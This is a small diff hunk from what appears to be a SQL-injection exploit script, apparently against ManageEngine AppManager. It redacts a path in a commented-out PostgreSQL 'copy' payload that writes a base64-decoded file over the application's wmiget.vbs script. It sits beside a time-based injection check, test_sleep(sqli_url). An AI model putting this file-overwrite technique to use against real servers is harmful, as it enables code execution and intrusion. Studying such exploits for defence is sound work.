@@ -111,7 +111,7 @@ test_sleep(sqli_url)
 
 
 #copy (select convert_from(decode($$ENCODED_PAYLOAD$$,$$base64$$),$$utf-8$$)) to
-#$$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;
+#$$C:\\Program+Files+(x86)\\xxx\\Axxx\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;
 #
 #
 #c
